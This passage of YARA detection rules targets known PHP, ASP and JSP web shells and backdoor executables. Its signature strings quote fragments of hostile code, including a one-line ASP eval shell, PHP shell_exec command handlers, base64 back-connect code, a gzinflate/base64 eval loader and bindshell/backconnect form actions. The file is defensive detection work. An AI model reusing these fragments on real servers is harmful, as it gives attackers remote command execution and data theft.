hash4 = "697dae78c040150daff7db751fc0c03c"
hash5 = "513b7be8bd0595c377283a7c87b44b2e"
hash6 = "1d912c55b96e2efe8ca873d6040e3b30"
hash7 = "e5b2131dd1db0dbdb43b53c5ce99016a"
hash8 = "4108f28a9792b50d95f95b9e5314fa1e"
hash9 = "41af6fd253648885c7ad2ed524e0692d"
hash10 = "6fcc283470465eed4870bcc3e2d7f14d"
strings:
$s0 = "kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuI"
$s11 = "Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KIC"
condition:
all of them
}
rule SSC_webshell_asp_shell : webshell {
meta:
description = "Web Shell - file shell.asp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "e63f5a96570e1faf4c7b8ca6df750237"
strings:
$s7 = "<input type=\"submit\" name=\"Send\" value=\"GO!\">" fullword
$s8 = "<TEXTAREA NAME=\"1988\" ROWS=\"18\" COLS=\"78\"></TEXTAREA>" fullword
condition:
all of them
}
rule SSC_multiple_webshells_0018 {
meta:
description = "Semi-Auto-generated  - from files webadmin.php.php.txt, iMHaPFtp.php.php.txt, Private-i3lue.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
super_rule = 1
was = "_webadmin_php_php_iMHaPFtp_php_php_Private_i3lue_php"
hash0 = "b268e6fa3bf3fe496cffb4ea574ec4c7"
hash1 = "12911b73bc6a5d313b494102abcf5c57"
hash2 = "13f5c7a035ecce5f9f380967cf9d4e92"
strings:
$s0 = "return $type . $owner . $group . $other;" fullword
$s1 = "$owner  = ($mode & 00400) ? 'r' : '-';" fullword
condition:
all of them
}
rule SSC_shells_PHP_wso {
meta:
description = "Semi-Auto-generated  - file wso.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "33e2891c13b78328da9062fbfcf898b6"
strings:
$s0 = "$back_connect_p=\"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbi"
$s3 = "echo '<h1>Execution PHP-code</h1><div class=content><form name=pf method=pos"
condition:
1 of them
}
rule SSC_multiple_webshells_0015 {
meta:
description = "Semi-Auto-generated  - from files wacking.php.php.txt, 1.txt, SpecialShell_99.php.php.txt, c100.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
super_rule = 1
was = "_wacking_php_php_1_SpecialShell_99_php_php_c100_php"
hash0 = "9c5bb5e3a46ec28039e8986324e42792"
hash1 = "44542e5c3e9790815c49d5f9beffbbf2"
hash2 = "09609851caa129e40b0d56e90dfc476c"
hash3 = "38fd7e45f9c11a37463c3ded1c76af4c"
strings:
$s0 = "if(eregi(\"./shbd $por\",$scan))"
$s1 = "$_POST['backconnectip']"
$s2 = "$_POST['backcconnmsg']"
condition:
1 of them
}
rule SSC_webshell_jsp_list1 {
meta:
description = "Web Shell - file list1.jsp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "8d9e5afa77303c9c01ff34ea4e7f6ca6"
strings:
$s1 = "case 's':ConnectionDBM(out,encodeChange(request.getParameter(\"drive"
$s9 = "return \"<a href=\\\"javascript:delFile('\"+folderReplace(file)+\"')\\\""
condition:
all of them
}
rule SSC_byshell063_ntboot_2 {
meta:
description = "Webshells Auto-generated - file ntboot.dll"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "cb9eb5a6ff327f4d6c46aacbbe9dda9d"
strings:
$s6 = "OK,job was done,cuz we have localsystem & SE_DEBUG_NAME:)"
condition:
all of them
}
rule SSC_phpshell_3 {
meta:
description = "Webshells Auto-generated - file phpshell.php"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "e8693a2d4a2ffea4df03bb678df3dc6d"
strings:
$s3 = "<input name=\"submit_btn\" type=\"submit\" value=\"Execute Command\"></p>"
$s5 = "      echo \"<option value=\\\"$work_dir\\\" selected>Current Directory</option>\\n\";"
condition:
all of them
}
rule SSC_php_in_image
{
meta:
author      = "Vlad https://github.com/vlad-s"
date        = "2016/07/18"
description = "Finds image files w/ PHP code in images"
strings:
$gif = /^GIF8[79]a/
$jfif = { ff d8 ff e? 00 10 4a 46 49 46 }
$png = { 89 50 4e 47 0d 0a 1a 0a }
$php_tag = "<?php"
condition:
(($gif at 0) or
($jfif at 0) or
($png at 0)) and
$php_tag
}
rule SSC_webshell_itsec_itsecteam_shell_jHn {
meta:
description = "Web Shell - from files itsec.php, itsecteam_shell.php, jHn.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
super_rule = 1
hash0 = "8ae9d2b50dc382f0571cd7492f079836"
hash1 = "bd6d3b2763c705a01cc2b3f105a25fa4"
hash2 = "40c6ecf77253e805ace85f119fe1cebb"
strings:
$s4 = "echo $head.\"<font face='Tahoma' size='2'>Operating System : \".php_uname().\"<b"
$s5 = "echo \"<center><form name=client method='POST' action='$_SERVER[PHP_SELF]?do=db'"
condition:
all of them
}
rule SSC_Liz0ziM_Private_Safe_Mode_Command_Execuriton_Bypass_Exploit_php {
meta:
description = "Semi-Auto-generated  - file Liz0ziM Private Safe Mode Command Execuriton Bypass Exploit.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "c6eeacbe779518ea78b8f7ed5f63fc11"
strings:
$s0 = "<option value=\"cat /var/cpanel/accounting.log\">/var/cpanel/accounting.log</opt"
$s1 = "Liz0ziM Private Safe Mode Command Execuriton Bypass"
$s2 = "echo \"<b><font color=red>Kimim Ben :=)</font></b>:$uid<br>\";" fullword
condition:
1 of them
}
rule SSC_WebShell_php_webshells_NGH {
meta:
description = "PHP Webshells Github Archive - file NGH.php"
author = "Florian Roth"
hash = "c05b5deecfc6de972aa4652cb66da89cfb3e1645"
strings:
$s0 = "<title>Webcommander at <?=$_SERVER[\"HTTP_HOST\"]?></title>" fullword
$s2 = "/* Webcommander by Cr4sh_aka_RKL v0.3.9 NGH edition :p */" fullword
$s5 = "<form action=<?=$script?>?act=bindshell method=POST>" fullword
$s9 = "<form action=<?=$script?>?act=backconnect method=POST>" fullword
$s11 = "<form action=<?=$script?>?act=mkdir method=POST>" fullword
$s16 = "die(\"<font color=#DF0000>Login error</font>\");" fullword
$s20 = "<b>Bind /bin/bash at port: </b><input type=text name=port size=8>" fullword
condition:
2 of them
}
rule SSC_Asmodeus_v0_1_pl {
meta:
description = "Semi-Auto-generated  - file Asmodeus v0.1.pl.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "0978b672db0657103c79505df69cb4bb"
strings:
$s0 = "[url=http://www.governmentsecurity.org"
$s1 = "perl asmodeus.pl client 6666 127.0.0.1"
$s2 = "print \"Asmodeus Perl Remote Shell"
$s4 = "$internet_addr = inet_aton(\"$host\") or die \"ALOA:$!\\n\";" fullword
condition:
2 of them
}
rule SSC_WebShell_Generic_PHP_5 {
meta:
description = "PHP Webshells Github Archive - from files ex0shell.php, megabor.php, GRP WebShell 2.0 release build 2018 (C)2006,Great.php"
author = "Florian Roth"
super_rule = 1
hash0 = "64461ad8d8f23ea078201a31d747157f701a4e00"
hash1 = "3df1afbcfa718da6fc8af27554834ff6d1a86562"
hash2 = "ad86ef7f24f75081318146edc788e5466722a629"
strings:
$s0 = "(($perms & 0x0400) ? 'S' : '-'));" fullword
$s10 = "} elseif (($perms & 0x8000) == 0x8000) {" fullword
$s11 = "if (($perms & 0xC000) == 0xC000) {" fullword
$s12 = "$info .= (($perms & 0x0008) ?" fullword
$s16 = "// Block special" fullword
$s18 = "$info = 's';" fullword
condition:
all of them
}
rule SSC_Pack_InjectT {
meta:
description = "Webshells Auto-generated - file InjectT.exe"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "983b74ccd57f6195a0584cdfb27d55e8"
strings:
$s3 = "ail To Open Registry"
$s4 = "32fDssignim"
$s5 = "vide Internet S"
$s6 = "d]Software\\M"
$s7 = "TInject.Dll"
condition:
all of them
}
rule SSC_webshell_PHP_a : webshell {
meta:
description = "Web Shell - file a.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "e3b461f7464d81f5022419d87315a90d"
strings:
$s1 = "echo \"<option value=\\\"\". strrev(substr(strstr(strrev($work_dir), \"/\""
$s2 = "echo \"<option value=\\\"$work_dir\\\" selected>Current Directory</option>"
$s4 = "<input name=\"submit_btn\" type=\"submit\" value=\"Execute Command\"></p> " fullword
condition:
2 of them
}
rule SSC_HYTop_DevPack_config {
meta:
description = "Webshells Auto-generated - file config.asp"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "b41d0e64e64a685178a3155195921d61"
strings:
$s0 = "const adminPassword=\""
$s2 = "const userPassword=\""
$s3 = "const mVersion="
condition:
all of them
}
rule SSC_Rem_View_php_php {
meta:
description = "Semi-Auto-generated  - file Rem View.php.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "29420106d9a81553ef0d1ca72b9934d9"
strings:
$s0 = "$php=\"/* line 1 */\\n\\n// \".mm(\"for example, uncomment next line\").\""
$s2 = "<input type=submit value='\".mm(\"Delete all dir/files recursive\").\" (rm -fr)'"
$s4 ="Welcome to phpRemoteView (RemView)"
condition:
1 of them
}
rule SSC_webshell_shell_phpspy_2006_arabicspy_hkrkoz {
meta:
description = "Web Shell - from files shell.php, phpspy_2006.php, arabicspy.php, hkrkoz.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
super_rule = 1
hash0 = "791708057d8b429d91357d38edf43cc0"
hash1 = "40a1f840111996ff7200d18968e42cfe"
hash2 = "e0202adff532b28ef1ba206cf95962f2"
hash3 = "802f5cae46d394b297482fd0c27cb2fc"
strings:
$s5 = "$prog = isset($_POST['prog']) ? $_POST['prog'] : \"/c net start > \".$pathname."
condition:
all of them
}
rule SSC_Unpack_Injectt {
meta:
description = "Webshells Auto-generated - file Injectt.exe"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "8a5d2158a566c87edc999771e12d42c5"
strings:
$s2 = "%s -Run                              -->To Install And Run The Service"
$s3 = "%s -Uninstall                        -->To Uninstall The Service"
$s4 = "(STANDARD_RIGHTS_REQUIRED |SC_MANAGER_CONNECT |SC_MANAGER_CREATE_SERVICE |SC_MAN"
condition:
all of them
}
rule SSC_DxShell_php_php {
meta:
description = "Semi-Auto-generated  - file DxShell.php.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "33a2b31810178f4c2e71fbdeb4899244"
strings:
$s0 = "print \"\\n\".'Tip: to view the file \"as is\" - open the page in <a href=\"'.Dx"
$s2 = "print \"\\n\".'<tr><td width=100pt class=linelisting><nobr>POST (php eval)</td><"
condition:
1 of them
}
rule SSC_FSO_s_zehir4 {
meta:
description = "Webshells Auto-generated - file zehir4.asp"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "5b496a61363d304532bcf52ee21f5d55"
strings:
$s5 = " byMesaj "
condition:
all of them
}
rule SSC_shelltools_g0t_root_HideRun {
meta:
description = "Webshells Auto-generated - file HideRun.exe"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "45436d9bfd8ff94b71eeaeb280025afe"
strings:
$s0 = "Usage -- hiderun [AppName]"
$s7 = "PVAX SW, Alexey A. Popoff, Moscow, 1997."
condition:
all of them
}
rule SSC_telnetd_pl {
meta:
description = "Semi-Auto-generated  - file telnetd.pl.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "5f61136afd17eb025109304bd8d6d414"
strings:
$s0 = "0ldW0lf" fullword
$s1 = "However you are lucky :P"
$s2 = "I'm FuCKeD"
$s3 = "ioctl($CLIENT{$client}->{shell}, &TIOCSWINSZ, $winsize);#"
$s4 = "atrix@irc.brasnet.org"
condition:
1 of them
}
rule SSC_webshell_webshells_new_jspyyy {
meta:
description = "Web shells - generated from file jspyyy.jsp"
author = "Florian Roth"
date = "2014/03/28"
score = 70
hash = "b291bf3ccc9dac8b5c7e1739b8fa742e"
strings:
$s0 = "<%@page import=\"java.io.*\"%><%if(request.getParameter(\"f\")"
condition:
all of them
}
rule SSC_FSO_s_indexer {
meta:
description = "Webshells Auto-generated - file indexer.asp"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "135fc50f85228691b401848caef3be9e"
strings:
$s3 = "<td>Nereye :<td><input type=\"text\" name=\"nereye\" size=25></td><td><input type=\"r"
condition:
all of them
}
rule SSC_rdrbs084 {
meta:
description = "Webshells Auto-generated - file rdrbs084.exe"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "ed30327b255816bdd7590bf891aa0020"
strings:
$s0 = "Create mapped port. You have to specify domain when using HTTP type."
$s8 = "<LOCAL PORT> <MAPPING SERVER> <MAPPING SERVER PORT> <TARGET SERVER> <TARGET"
condition:
all of them
}
rule SSC_webshell_h4ntu_shell_powered_by_tsoi_  : webshell {
meta:
description = "Web Shell - file h4ntu shell [powered by tsoi].php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "06ed0b2398f8096f1bebf092d0526137"
strings:
$s0 = "  <TD><DIV STYLE=\"font-family: verdana; font-size: 10px;\"><b>Server Adress:</b"
$s3 = "  <TD><DIV STYLE=\"font-family: verdana; font-size: 10px;\"><b>User Info:</b> ui"
$s4 = "    <TD><DIV STYLE=\"font-family: verdana; font-size: 10px;\"><?= $info ?>: <?= "
$s5 = "<INPUT TYPE=\"text\" NAME=\"cmd\" value=\"<?php echo stripslashes(htmlentities($"
condition:
all of them
}
rule SSC_httpdoor {
meta:
description = "Webshells Auto-generated - file httpdoor.exe"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "6097ea963455a09474471a9864593dc3"
strings:
$s4 = "''''''''''''''''''DaJKHPam"
$s5 = "o,WideCharR]!n]"
$s6 = "HAutoComplete"
$s7 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?> <assembly xmlns=\"urn:sch"
condition:
all of them
}
rule SSC_webshell_webshells_new_pHp {
meta:
description = "Web shells - generated from file pHp.php"
author = "Florian Roth"
date = "2014/03/28"
score = 70
hash = "b0e842bdf83396c3ef8c71ff94e64167"
strings:
$s0 = "if(is_readable($path)) antivirus($path.'/',$exs,$matches);" fullword
$s1 = "'/(eval|assert|include|require|include\\_once|require\\_once|array\\_map|arr"
$s13 = "'/(exec|shell\\_exec|system|passthru)+\\s*\\(\\s*\\$\\_(\\w+)\\[(.*)\\]\\s*"
$s14 = "'/(include|require|include\\_once|require\\_once)+\\s*\\(\\s*[\\'|\\\"](\\w+"
$s19 = "'/\\$\\_(\\w+)(.*)(eval|assert|include|require|include\\_once|require\\_once"
condition:
1 of them
}
rule SSC_webshell_ASP_aspydrv {
meta:
description = "Web Shell - file aspydrv.asp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "de0a58f7d1e200d0b2c801a94ebce330"
strings:
$s3 = "<%=thingy.DriveLetter%> </td><td><tt> <%=thingy.DriveType%> </td><td><tt> <%=thi"
condition:
all of them
}
rule SSC_thelast_index3 {
meta:
description = "Webshells Auto-generated - file index3.php"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "cceff6dc247aaa25512bad22120a14b4"
strings:
$s5 = "$err = \"<i>Your Name</i> Not Entered!</font></h2>Sorry, \\\"Your Name\\\" field is r"
condition:
all of them
}
rule SSC_multiple_webshells_0029 {
meta:
description = "Semi-Auto-generated  - from files c99shell_v1.0.php.php.txt, c99php.txt, 1.txt, c2007.php.php.txt, c100.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
super_rule = 1
was = "_c99shell_v1_0_php_php_c99php_1_c2007_php_php_c100_php"
hash0 = "d8ae5819a0a2349ec552cbcf3a62c975"
hash1 = "9e9ae0332ada9c3797d6cee92c2ede62"
hash2 = "44542e5c3e9790815c49d5f9beffbbf2"
hash3 = "d089e7168373a0634e1ac18c0ee00085"
hash4 = "38fd7e45f9c11a37463c3ded1c76af4c"
strings:
$s0 = "$result = mysql_query(\"SHOW PROCESSLIST\", $sql_sock); " fullword
condition:
all of them
}
rule SSC_Moroccan_Spamers_Ma_EditioN_By_GhOsT_php {
meta:
description = "Semi-Auto-generated  - file Moroccan Spamers Ma-EditioN By GhOsT.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "d1b7b311a7ffffebf51437d7cd97dc65"
strings:
$s0 = ";$sd98=\"john.barker446@gmail.com\""
$s1 = "print \"Sending mail to $to....... \";"
$s2 = "<td colspan=\"2\" width=\"715\" background=\"/simparts/images/cellpic1.gif\" hei"
condition:
1 of them
}
rule SSC_jsp_cmd : webshell {
meta:
description = "Laudanum Injector Tools - file cmd.war"
author = "Florian Roth"
reference = "http://laudanum.inguardians.com/"
date = "2015-06-22"
hash = "55e4c3dc00cfab7ac16e7cfb53c11b0c01c16d3d"
strings:
$s0 = "cmd.jsp}" fullword ascii
$s1 = "cmd.jspPK" fullword ascii
$s2 = "WEB-INF/web.xml" fullword ascii /* Goodware String - occured 1 times */
$s3 = "WEB-INF/web.xmlPK" fullword ascii /* Goodware String - occured 1 times */
$s4 = "META-INF/MANIFEST.MF" fullword ascii /* Goodware String - occured 12 times */
condition:
uint16(0) == 0x4b50 and filesize < 2KB and all of them
}
rule SSC_c99madshell_v2_0_php_php {
meta:
description = "Semi-Auto-generated  - file c99madshell_v2.0.php.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "d27292895da9afa5b60b9d3014f39294"
strings:
$s2 = "eval(gzinflate(base64_decode('HJ3HkqNQEkU/ZzqCBd4t8V4YAQI2E3jvPV8/1Gw6orsVFLyXef"
condition:
all of them
}
rule SSC_webshell_jsp_asd {
meta:
description = "Web Shell - file asd.jsp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "a042c2ca64176410236fcc97484ec599"
strings:
$s3 = "<%@ page language=\"java\" pageEncoding=\"gbk\"%>" fullword
$s6 = "<input size=\"100\" value=\"<%=application.getRealPath(\"/\") %>\" name=\"url"
condition:
all of them
}
rule SSC_webshell_PHP_sql  : webshell {
meta:
description = "Web Shell - file sql.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "2cf20a207695bbc2311a998d1d795c35"
strings:
$s0 = "$result=mysql_list_tables($db) or die (\"$h_error<b>\".mysql_error().\"</b>$f_"
$s4 = "print \"<a href=\\\"$_SERVER[PHP_SELF]?s=$s&login=$login&passwd=$passwd&"
condition:
all of them
}
rule SSC_saphpshell {
meta:
description = "Webshells Auto-generated - file saphpshell.php"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "d7bba8def713512ddda14baf9cd6889a"
strings:
$s0 = "<td><input type=\"text\" name=\"command\" size=\"60\" value=\"<?=$_POST['command']?>"
condition:
all of them
}
rule SSC_multiple_webshells_0007 {
meta:
description = "Semi-Auto-generated  - from files r577.php.php.txt, spy.php.php.txt, s.php.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
super_rule = 1
was = "_r577_php_php_spy_php_php_s_php_php"
hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
hash1 = "eed14de3907c9aa2550d95550d1a2d5f"
hash2 = "817671e1bdc85e04cc3440bbd9288800"
strings:
$s2 = "echo $te.\"<div align=center><textarea cols=35 name=db_query>\".(!empty($_POST['"
$s3 = "echo sr(45,\"<b>\".$lang[$language.'_text80'].$arrow.\"</b>\",\"<select name=db>"
condition:
1 of them
}
rule SSC_webshell_cihshell_fix : webshell {
meta:
description = "Web Shell - file cihshell_fix.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "3823ac218032549b86ee7c26f10c4cb5"
strings:
$s7 = "<tr style='background:#242424;' ><td style='padding:10px;'><form action='' encty"
$s8 = "if (isset($_POST['mysqlw_host'])){$dbhost = $_POST['mysqlw_host'];} else {$dbhos"
condition:
1 of them
}
rule SSC_webshell_s72_Shell_v1_1_Coding {
meta:
description = "Web Shell - file s72 Shell v1.1 Coding.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "c2e8346a5515c81797af36e7e4a3828e"
strings:
$s5 = "<font face=\"Verdana\" style=\"font-size: 8pt\" color=\"#800080\">Buradan Dosya "
condition:
all of them
}
rule SSC_webshell_jsp_action {
meta:
description = "Web Shell - file action.jsp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "5a7d931094f5570aaf5b7b3b06c3d8c0"
strings:
$s1 = "String url=\"jdbc:oracle:thin:@localhost:1521:orcl\";" fullword
$s6 = "<%@ page contentType=\"text/html;charset=gb2312\"%>" fullword
condition:
all of them
}
rule SSC_webshell_webshells_new_JJjsp3 {
meta:
description = "Web shells - generated from file JJjsp3.jsp"
author = "Florian Roth"
date = "2014/03/28"
score = 70
hash = "949ffee1e07a1269df7c69b9722d293e"
strings:
$s0 = "<%@page import=\"java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*\"%><%!S"
condition:
all of them
}
rule SSC_sig_2008_php_php {
meta:
description = "Semi-Auto-generated  - file 2008.php.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "3e4ba470d4c38765e4b16ed930facf2c"
strings:
$s0 = "Codz by angel(4ngel)"
$s1 = "Web: http://www.4ngel.net"
$s2 = "$admin['cookielife'] = 86400;"
$s3 = "$errmsg = 'The file you want Downloadable was nonexistent';"
condition:
1 of them
}
rule SSC_webshell_phpspy_2005_full_phpspy_2005_lite_phpspy_2006_PHPSPY {
meta:
description = "Web Shell - from files phpspy_2005_full.php, phpspy_2005_lite.php, phpspy_2006.php, PHPSPY.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
super_rule = 1
hash0 = "b68bfafc6059fd26732fa07fb6f7f640"
hash1 = "42f211cec8032eb0881e87ebdb3d7224"
hash2 = "40a1f840111996ff7200d18968e42cfe"
hash3 = "0712e3dc262b4e1f98ed25760b206836"
strings:
$s4 = "http://www.4ngel.net" fullword
$s5 = "</a> | <a href=\"?action=phpenv\">PHP" fullword
$s8 = "echo $msg=@fwrite($fp,$_POST['filecontent']) ? \"" fullword
$s9 = "Codz by Angel" fullword
condition:
2 of them
}
rule SSC_BIN_Client {
meta:
description = "Webshells Auto-generated - file Client.exe"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "9f0a74ec81bc2f26f16c5c172b80eca7"
strings:
$s0 = "=====Remote Shell Closed====="
$s2 = "All Files(*.*)|*.*||"
$s6 = "WSAStartup Error!"
$s7 = "SHGetFileInfoA"
$s8 = "CreateThread False!"
$s9 = "Port Number Error"
condition:
4 of them
}
rule SSC_webshell_elmaliseker_2 {
meta:
description = "Web Shell - file elmaliseker.asp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "b32d1730d23a660fd6aa8e60c3dc549f"
strings:
$s1 = "<td<%if (FSO.GetExtensionName(path & \"\\\" & oFile.Name)=\"lnk\") or (FSO.GetEx"
$s6 = "<input type=button value=Save onclick=\"EditorCommand('Save')\"> <input type=but"
condition:
all of them
}
rule SSC_cmdShell {
meta:
description = "Webshells Auto-generated - file cmdShell.asp"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "8a9fef43209b5d2d4b81dfbb45182036"
strings:
$s1 = "if cmdPath=\"wscriptShell\" then"
condition:
all of them
}
rule SSC_dbgntboot {
meta:
description = "Webshells Auto-generated - file dbgntboot.dll"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "4d87543d4d7f73c1529c9f8066b475ab"
strings:
$s2 = "now DOS is working at mode %d,faketype %d,against %s,has worked %d minutes,by sp"
$s3 = "sth junk the M$ Wind0wZ retur"
condition:
all of them
}
rule SSC_multiple_webshells_0022 {
meta:
description = "Semi-Auto-generated  - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt, c99shell_v1.0.php.php.txt, SpecialShell_99.php.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
super_rule = 1
was = "_w_php_php_c99madshell_v2_1_php_php_wacking_php_php_c99shell_v1_0_php_php_SpecialShell_99_php_php"
hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
hash1 = "3ca5886cd54d495dc95793579611f59a"
hash2 = "9c5bb5e3a46ec28039e8986324e42792"
hash3 = "d8ae5819a0a2349ec552cbcf3a62c975"
hash4 = "09609851caa129e40b0d56e90dfc476c"
strings:
$s0 = "c99ftpbrutecheck"
$s1 = "$ftpquick_t = round(getmicrotime()-$ftpquick_st,4);" fullword
$s2 = "$fqb_lenght = $nixpwdperpage;" fullword
$s3 = "$sock = @ftp_connect($host,$port,$timeout);" fullword
condition:
2 of them
}
rule SSC_PHP_Backdoor_Connect_pl_php {
meta:
description = "Semi-Auto-generated  - file PHP Backdoor Connect.pl.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "57fcd9560dac244aeaf95fd606621900"
strings:
$s0 = "LorD of IRAN HACKERS SABOTAGE"
$s1 = "LorD-C0d3r-NT"
$s2 = "echo --==Userinfo==-- ;"
condition:
1 of them
}
rule SSC_webshell_caidao_shell_mdb {
meta:
description = "Web Shell - file mdb.asp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "fbf3847acef4844f3a0d04230f6b9ff9"
strings:
$s1 = "<% execute request(\"ice\")%>a " fullword
condition:
all of them
}
rule SSC_webshell {
meta:
description = "Webshells Auto-generated - file webshell.php"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "f2f8c02921f29368234bfb4d4622ad19"
strings:
$s0 = "RhViRYOzz"
$s1 = "d\\O!jWW"
$s2 = "bc!jWW"
$s3 = "0W[&{l"
$s4 = "[INhQ@\\"
condition:
all of them
}
rule SSC_FSO_s_ajan {
meta:
description = "Webshells Auto-generated - file ajan.asp"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "22194f8c44524f80254e1b5aec67b03e"
strings:
$s4 = "entrika.write \"BinaryStream.SaveToFile"
condition:
all of them
}
rule SSC_JSP_Browser_APT_webshell {
meta:
description = "VonLoesch JSP Browser used as web shell by APT groups - jsp File browser 1.1a"
author = "F.Roth"
date = "10.10.2014"
score = 60
strings:
$a1a = "private static final String[] COMMAND_INTERPRETER = {\"" ascii
$a1b = "cmd\", \"/C\"}; // Dos,Windows" ascii
$a2 = "Process ls_proc = Runtime.getRuntime().exec(comm, null, new File(dir));" ascii
$a3 = "ret.append(\"!!!! Process has timed out, destroyed !!!!!\");" ascii
condition:
all of them
}
rule SSC_WebShell_AK_74_Security_Team_Web_Shell_Beta_Version {
meta:
description = "PHP Webshells Github Archive - file AK-74 Security Team Web Shell Beta Version.php"
author = "Florian Roth"
hash = "c90b0ba575f432ecc08f8f292f3013b5532fe2c4"
strings:
$s8 = "- AK-74 Security Team Web Site: www.ak74-team.net" fullword
$s9 = "<b><font color=#830000>8. X Forwarded For IP - </font></b><font color=#830000>'."
$s10 = "<b><font color=#83000>Execute system commands!</font></b>" fullword
condition:
1 of them
}
rule SSC_ZXshell2_0_rar_Folder_ZXshell {
meta:
description = "Webshells Auto-generated - file ZXshell.exe"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "246ce44502d2f6002d720d350e26c288"
strings:
$s0 = "WPreviewPagesn"
$s1 = "DA!OLUTELY N"
condition:
all of them
}
rule SSC_multiple_webshells_0014 {
meta:
description = "Semi-Auto-generated  - from files r577.php.php.txt, r57 Shell.php.php.txt, spy.php.php.txt, s.php.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
super_rule = 1
was = "_r577_php_php_r57_Shell_php_php_spy_php_php_s_php_php"
hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
hash1 = "8023394542cddf8aee5dec6072ed02b5"
hash2 = "eed14de3907c9aa2550d95550d1a2d5f"
hash3 = "817671e1bdc85e04cc3440bbd9288800"
strings:
$s0 = "echo ws(2).$lb.\" <a"
$s1 = "$sql = \"LOAD DATA INFILE \\\"\".$_POST['test3_file']"
$s3 = "if (empty($_POST['cmd'])&&!$safe_mode) { $_POST['cmd']=($windows)?(\"dir\"):(\"l"
condition:
2 of them
}
rule SSC_simple_cmd_html {
meta:
description = "Semi-Auto-generated  - file simple_cmd.html.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "c6381412df74dbf3bcd5a2b31522b544"
strings:
$s1 = "<title>G-Security Webshell</title>" fullword
$s2 = "<input type=TEXT name=\"-cmd\" size=64 value=\"<?=$cmd?>\" " fullword
$s3 = "<? if($cmd != \"\") print Shell_Exec($cmd);?>" fullword
$s4 = "<? $cmd = $_REQUEST[\"-cmd\"];?>" fullword
condition:
all of them
}
rule SSC_webshell_asp_cmdasp {
meta:
description = "Web Shell - file cmdasp.asp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "57b51418a799d2d016be546f399c2e9b"
strings:
$s0 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>" fullword
$s7 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)" fullword
condition:
all of them
}
rule SSC_webshell_jsp_utils {
meta:
description = "Web Shell - file utils.jsp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "9827ba2e8329075358b8e8a53e20d545"
strings:
$s0 = "ResultSet r = c.getMetaData().getTables(null, null, \"%\", t);" fullword
$s4 = "String cs = request.getParameter(\"z0\")==null?\"gbk\": request.getParameter(\"z"
condition:
all of them
}
rule SSC_webshell_asp_list {
meta:
description = "Web Shell - file list.asp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "1cfa493a165eb4b43e6d4cc0f2eab575"
strings:
